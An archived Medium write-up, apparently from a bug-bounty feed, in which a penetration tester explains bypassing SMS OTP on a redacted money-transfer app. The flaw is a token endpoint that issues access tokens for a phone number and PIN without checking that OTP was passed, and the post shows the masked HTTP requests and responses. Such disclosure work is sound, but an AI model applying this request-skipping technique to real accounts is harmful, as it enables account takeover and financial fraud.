# A trivial OTP Bypass Based On Business Logic Abuse

- **Source URL:** https://medium.com/@yagizkocer/a-trivial-otp-bypass-based-on-business-logic-abuse-1513872716b0?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20251128011232/https://medium.com/@yagizkocer/a-trivial-otp-bypass-based-on-business-logic-abuse-1513872716b0
- **Fetched:** 2026-11-27
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/3261 (id 3261)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# A trivial OTP Bypass Based On Business Logic Abuse

Hello everyone, in our latest penetration testing, our customer has a mobile application with 2FA implementation. I will explain how I bypassed it based on their implementation of 2FA. I will mention the company as “redacted.com” for confidentiality purpose. Let’s start !

Company has a mobile application with 2FA implementation on default. It is an application that let’s people transact money, so lots of important credentials such as identity numbers and card numbers of that customer were inside of that application. The login steps of the application are like below.

1. Enter the phone number that you registered.
2. If phone exist on the system, it will redirect to you OTP page and sends an OTP code to your phone via SMS
3. After the OTP code is entered successfully. It will redirect to another page that lets you enter password.
4. After the password login. It gave you the token to use for the rest of the application actions.

I will try the basic things first. I tried to brute force OTP but application has a rate limit. Tried to change the OTP result code to “200” but still no result.

After these tries I went back to Burp Suite and started to inspect the requests. A strange business logic came to my eye;

After the phone verification it redirects to the OTP and if its successful it returns the user info from the phone number that is registered.

```
POST /mapi/v3/check_otp_pass HTTP/2
Host: redacted.com
Content-Type: application/json; charset=utf-8
Accept: application/json
Accept-Encoding: gzip, deflate
Content-Length: 183
{"client_id":"************","client_secret":"************","gsm":"************","otp_password":"123456","process":"update"}
```
```
HTTP/2 200 OK
Date: Thu, 22 Jun 2023 10:21:36 GMT
Content-Type: application/json; charset=utf-8
Vary: Accept-Encoding
Vary: Origin
X-Frame-Options: SAMEORIGIN
X-Xss-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Download-Options: noopen
X-Permitted-Cross-Domain-Policies: none
Referrer-Policy: strict-origin-when-cross-origin
Cache-Control: max-age=0, private, must-revalidate
{"code":"200","data":{"opy_user":{"id":*****,"name_surname":"*****","email":"*****","gsm":"*****","id_no":"*****","date_of_birth":"*****","pin":true},"process":"update","process_hash":"*****"},"message":"Successfully entered OTP Code."}
```
After that it redirects to the pin page which lets you entered the pin for your account. If you entered the correct pin, it gives you the token.

```
POST /mapi/v3/oauth/token HTTP/2
Host: redacted.com
Content-Type: application/json; charset=utf-8
Accept: application/json
Accept-Encoding: gzip, deflate
Content-Length: 179
{"grant_type":"password","gsm":"55555555","pin":"123456","client_id":"******","client_secret":"*****"}
```
And the response brings the token.

```
HTTP/2 200 OK
Date: Thu, 22 Jun 2023 10:30:12 GMT
Content-Type: application/json; charset=utf-8
Vary: Accept-Encoding
Vary: Origin
Cache-Control: private, no-store
Pragma: no-cache
{"access_token":"****","token_type":"Bearer","expires_in":86400,"refresh_token":"****","created_at":****,"subscribe_channel":[],"unsubscribe_channel":[]
```
After the token, user interacts with the all application based on this token.

After inspecting these two request, the strange thing came up to my eye. OTP code is just for redirecting for the pin page, but the token request does not contain anything about the OTP code verification. When I tried to bypass the OTP code and straightly went with the token request with just providing the phone number and the pin, I successfully got the token and do every action on the application without OTP code.

## Summary

This flaw causes from lack of checking the OTP verification to get the token. The OTP check request is just a standalone request that just directs to the pin page if its correct and no relation with the token request. Thank you for reading !
